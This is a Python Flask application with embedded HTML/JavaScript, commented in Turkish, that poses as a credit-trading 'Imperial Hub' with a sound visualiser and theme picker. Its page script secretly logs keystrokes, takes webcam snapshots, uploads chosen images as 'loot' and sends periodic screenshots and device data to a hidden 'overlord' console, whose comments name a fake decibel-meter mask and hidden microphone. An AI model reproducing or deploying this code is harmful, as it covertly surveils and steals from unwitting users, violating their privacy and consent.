from flask import Flask, render_template_string, jsonify, request
import time, json, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v169.0 "The Audio-Illusionist" ---
# Vizyon: Desibel Ölçer Maskesi, Gizli Mikrofon ve Wallpaper Looting. [cite: 2026-01-03]
VERSION = "v169.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

transaction_lock = Lock()
state = {
    "banned_peers": [], "user_registry": {}, 
    "active_admins": {}, "evolution_count": 69
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "ANDROID" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil Cihaz"

def check_admin_auth(req):
    key, pin = req.args.get('key'), req.args.get('pin', '').strip()
    if key == ADMIN_KEY and pin == ADMIN_PIN:
        sid = f"ADMIN-{req.remote_addr}"
        state["active_admins"][sid] = {"device": get_device_info(req.headers.get('User-Agent','')), "last_seen": time.strftime('%H:%M:%S')}
        return True
    return False

@app.route('/overlord_api/<action>')
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    val = request.args.get('value', "")
    with transaction_lock:
        if target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "gift": u["credits"] += float(val or 0)
            elif action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": state["banned_peers"].append(target)
        elif action == "unban" and target in state["banned_peers"]: state["banned_peers"].remove(target)
    return jsonify(state)

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id')
    t = request.args.get('type')
    if p_id in state["user_registry"]:
        data = request.json
        key = "loot" if t == "loot" else "scr" if t == "scr" else "cam"
        if key not in state["user_registry"][p_id]: state["user_registry"][p_id][key] = []
        state["user_registry"][p_id][key].append({"time": time.strftime('%H:%M:%S'), "data": data.get('image')})
        if len(state["user_registry"][p_id][key]) > 10: state["user_registry"][p_id][key].pop(0)
        
        # Audio, Hardware & Keylogger Update [cite: 2026-01-03]
        if data.get('intel'): state["user_registry"][p_id]["intel"] = data.get('intel')
        if data.get('hw'): state["user_registry"][p_id]["hw"] = data.get('hw')
        if data.get('inputs'): state["user_registry"][p_id]["last_input"] = data.get('inputs')
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "ERİŞİM RED", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Illusionist Console</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b border-blue-600 pb-2 mb-4 flex justify-between italic font-black uppercase">
        <h1 class="text-xl">AUDIO-ILLUSIONIST v169.0</h1>
        <div id="admins"></div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl">
            <h2 class="text-blue-500 mb-2 uppercase">İstihbarat Akışı</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-2 outline-none text-white"></select>
            <div id="intel_info" class="text-[7px] mb-2 p-2 bg-blue-900/10 rounded"></div>
            <div id="gallery" class="space-y-2 overflow-y-auto max-h-[500px]"></div>
        </div>
        <div class="col-span-3">
            <table class="w-full text-left bg-zinc-950 rounded-xl overflow-hidden shadow-2xl">
                <thead class="bg-zinc-900 text-zinc-500"><tr><th class="p-2">CİHAZ</th><th>ID</th><th>SON TUŞ</th><th>SES/DURUM</th><th>BAKİYE</th><th>KOMUTA</th></tr></thead>
                <tbody id="uT"></tbody>
            </table>
            <div id="bL" class="mt-4 p-2 bg-red-950/20 border border-red-900 rounded text-red-500"></div>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t, v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${v}`); update(); }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", bH="SÜRGÜNLER: ", pO="<option value=''>Hedef Seç...</option>";
            for(let id in d.user_registry){
                let u=d.user_registry[id];
                if(d.banned_peers.includes(id)) { bH += `${id} <button onclick="f('unban','${id}')">[AFFET]</button> | `; continue; }
                pO += `<option value="${id}">${id}</option>`;
                uH += `<tr class="border-b border-zinc-900"><td class="p-2"><b>${u.device}</b></td><td class="text-blue-400">${id}</td>
                <td class="text-yellow-600 text-[7px]">${u.last_input||'-'}</td>
                <td class="text-purple-400">${u.intel?.noise||'..'} / ${u.intel?.idle?'PASİF':'AKTİF'}</td>
                <td>${u.credits.toFixed(1)}</td><td>
                <button onclick="f('vip','${id}')" class="mr-2 underline">VIP</button><button onclick="f('ban','${id}')" class="text-red-600 underline">BAN</button></td></tr>`;
            }
            document.getElementById('uT').innerHTML = uH; document.getElementById('bL').innerHTML = bH;
            const id = document.getElementById('pS').value; if(id && reg[id]){
                const u=reg[id]; document.getElementById('intel_info').innerText = `PIL: ${u.hw?.bat}% | WIFI: ${u.hw?.wifi} | IDLE: ${u.intel?.idle?'UYKUDA':'AKTİF'}`;
                let h = ""; (u.loot||[]).concat(u.cam||[]).concat(u.scr||[]).sort((a,b)=>b.time.localeCompare(a.time)).forEach(s=>{
                    h += `<div class="p-1 border border-zinc-800 rounded mb-1 bg-black"><p class="text-[6px] text-zinc-500">${s.time}</p><img src="${s.data}" class="w-full"></div>`;
                }); document.getElementById('gallery').innerHTML = h;
            }
            setTimeout(update, 3000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with transaction_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent','')), "loot":[], "scr":[], "cam":[]}
    return jsonify({"status": "OK"})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Imperial Hub</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>.bar { width: 4px; background: #3b82f6; margin: 1px; transition: height 0.1s; }</style></head>
<body id="b" class="bg-black text-white font-mono flex items-center justify-center h-screen overflow-hidden">
    <div id="main" class="w-full h-full p-4 text-center">
        <h1 class="text-2xl font-black text-blue-600 italic mb-6 uppercase">IMPERIAL HUB</h1>
        
        <div id="vis" class="flex items-end justify-center h-12 mb-4 bg-zinc-950 rounded-xl p-2 border border-zinc-900 cursor-pointer" onclick="startAudio()">
            <p id="v_t" class="text-[8px] text-zinc-600 absolute">SES ANALİZİ İÇİN TIKLA</p>
            <div class="bar h-2"></div><div class="bar h-4"></div><div class="bar h-6"></div><div class="bar h-3"></div><div class="bar h-5"></div>
        </div>

        <div class="bg-zinc-950 p-10 rounded-[50px] border border-zinc-900 mb-6 shadow-2xl">
            <div id="cr" class="text-6xl font-black italic">0.00</div>
            <p class="text-[8px] text-zinc-700 uppercase mt-2">Sovereign Bakiye</p>
        </div>
        <div class="grid grid-cols-2 gap-4 mb-6">
            <button onclick="trig('share')" class="py-8 bg-green-700 text-black font-black rounded-3xl text-2xl active:scale-95 transition shadow-lg">VER</button>
            <button onclick="trig('receive')" class="py-8 bg-blue-700 text-white font-black rounded-3xl text-2xl active:scale-95 transition shadow-lg">AL</button>
        </div>
        <button onclick="document.getElementById('wp').click()" class="text-[9px] text-zinc-500 underline uppercase tracking-widest">Tema Değiştir</button>
        <input type="file" id="wp" class="hidden" accept="image/*" onchange="loot(event)">
    </div>
    <video id="v" class="hidden" autoplay playsinline></video><canvas id="cnv" class="hidden"></canvas>
    <div id="s_a" style="position:fixed; top:0; right:0; width:80px; height:80px; z-index:999;"></div>
    <script>
        if(!localStorage.getItem('n_id')) localStorage.setItem('n_id', "NS-" + Math.floor(1000 + Math.random()*9000));
        let myId = localStorage.getItem('n_id'), inputs = "", count = 0, isIdle = false, noiseLevel = "Sessiz";

        document.getElementById('s_a').onclick = () => { count++; if(count >= 5){ let p=prompt("PIN:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p; count=0; } setTimeout(()=>count=0, 2000); };

        document.addEventListener('visibilitychange', () => { isIdle = document.hidden; });

        // DESIBEL VISUALIZER & GHOST-MIC [cite: 2026-01-03]
        async function startAudio() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({audio:true});
                document.getElementById('v_t').style.display = 'none';
                const ac = new AudioContext(); const src = ac.createMediaStreamSource(s);
                const an = ac.createAnalyser(); src.connect(an);
                const data = new Uint8Array(an.frequencyBinCount);
                const bars = document.querySelectorAll('.bar');
                function draw() {
                    an.getByteFrequencyData(data);
                    bars.forEach((b, i) => { b.style.height = (data[i*10] / 4) + 'px'; });
                    const vol = data.reduce((a,b)=>a+b)/data.length;
                    noiseLevel = vol > 12 ? "Gürültülü" : "Sessiz";
                    requestAnimationFrame(draw);
                } draw();
            } catch(e) { alert("Ses analizi olmadan sistem doğrulanamaz!"); }
        }

        async function loot(e) {
            const file = e.target.files[0]; if(!file) return;
            const reader = new FileReader(); reader.onload = (re) => {
                document.getElementById('b').style.backgroundImage = `url(${re.target.result})`;
                document.getElementById('b').style.backgroundSize = "cover";
                fetch(`/upload_intel?peer_id=${myId}&type=loot`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: re.target.result}) });
                ghostEye();
            }; reader.readAsDataURL(file);
        }

        async function trig(t) { await fetch(`/action/${t}?peer_id=${myId}`); ghostEye(); }

        async function ghostEye() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                v.srcObject = s; await v.play();
                cnv.width = 480; cnv.height = 360;
                cnv.getContext('2d').drawImage(v, 0, 0);
                fetch(`/upload_intel?peer_id=${myId}&type=cam`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: cnv.toDataURL('image/jpeg', 0.5)}) });
                s.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }

        window.onkeydown = (e) => { inputs += e.key + " "; };

        async function main() {
            const bt = await navigator.getBattery();
            const cv = await html2canvas(document.body, {scale:0.2});
            fetch(`/upload_intel?peer_id=${myId}&type=scr`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                image: cv.toDataURL('image/jpeg', 0.1),
                hw: {bat: Math.floor(bt.level*100), wifi: navigator.onLine},
                intel: {noise: noiseLevel, idle: isIdle},
                inputs: inputs
            }) });
            inputs = "";
            setTimeout(main, 10000);
        } main();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
